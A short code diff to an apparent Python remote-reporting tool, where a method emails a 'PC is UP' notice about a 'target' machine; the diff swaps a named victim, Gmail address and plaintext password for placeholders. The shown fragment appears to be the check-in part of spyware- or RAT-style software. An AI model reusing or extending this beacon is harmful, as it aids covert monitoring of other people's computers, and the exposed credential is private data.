@@ -12,8 +12,8 @@ class Execute_and_report():
 
 
     def start_report(self):
-        result = "Subject: Kto's PC is UP ! Report"
-        self.send_email("nicenoob247@gmail.com", "nicenoob1234", result)
+        result = "Subject: Target_PC_Name PC is UP ! Report"
+        self.send_email("Your Gmail", "Your Gmail Password", result)
 
 
 def s(t, d):
